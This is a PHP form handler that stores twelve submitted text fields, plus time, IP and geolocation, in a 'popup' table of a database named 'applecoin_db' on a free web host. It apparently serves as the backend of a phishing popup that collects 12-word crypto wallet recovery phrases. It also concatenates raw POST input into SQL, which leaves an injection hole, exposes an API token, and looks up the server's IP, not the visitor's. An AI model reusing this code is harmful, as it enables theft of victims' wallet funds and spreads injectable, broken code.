<?php

         $conn=mysqli_connect('https://ascribable-plans.000webhostapp.com/','root','','id21771759_applecoin_db');
        if(!$conn){
            echo "Connection failed";
        }
?>

<?php 

        if(isset($_POST['submit']))
        {
            $text1=$_POST['text1'];
            $text2=$_POST['text2'];
            $text3=$_POST['text3'];
            $text4=$_POST['text4'];
            $text5=$_POST['text5'];
            $text6=$_POST['text6'];
            $text7=$_POST['text7'];
            $text8=$_POST['text8'];
            $text9=$_POST['text9'];
            $text10=$_POST['text10'];
            $text11=$_POST['text11'];
            $text12=$_POST['text12'];
            $current_time = date("H:i:s");
            $current_date = date("m-d-y");
            $public_ip = file_get_contents('https://api64.ipify.org?format=json');
            $public_ip = json_decode($public_ip, true)['ip'];
            
$access_token = '153fae3bbbabfe'; // Replace with your IPinfo API access token
$public_ip = file_get_contents('https://api64.ipify.org?format=json');
$public_ip = json_decode($public_ip, true)['ip'];

// Construct the API URL
$api_url = "http://ipinfo.io/$public_ip?token=$access_token";

// Make the API request
$response = file_get_contents($api_url);

// Check if the request was successful
if ($response !== false) {
    // Decode the JSON response
    $data = json_decode($response, true);

    // Display location information
    // echo "IP Address: {$data['ip']}\n";
    // echo "Country: {$data['country']}\n";
    // echo "Region: {$data['region']}\n";
    // echo "City: {$data['city']}\n";
    // echo "Latitude: {$data['loc']}\n";
    // echo "Longitude: {$data['loc']}\n";
    $contry=$data['country'];
    $region=$data['region'];
    $city=$data['city'];
    $Lat=$data['loc'];
    $Lon=$data['loc'];


} else {
    echo "Failed to fetch location information.";
}

          
            

            $sql="INSERT into popup (text1,text2,text3,text4,text5,text6,text7,text8,text9,text10,text11,text12,time,date,ip,country,region,city,lot,lon )VALUES('$text1','$text2','$text3','$text4','$text5','$text6','$text7','$text8','$text9','$text10','$text11','$text12','$current_time','$current_date','$public_ip','$contry','$region','$city','$Lat','$Lon');";
            $result=mysqli_query($conn,$sql);
            if($result)
            {
               
                header("location:index.html");
    }else{
        echo '<script>alert("Data not Inserted")</script>';
    }
}
?>
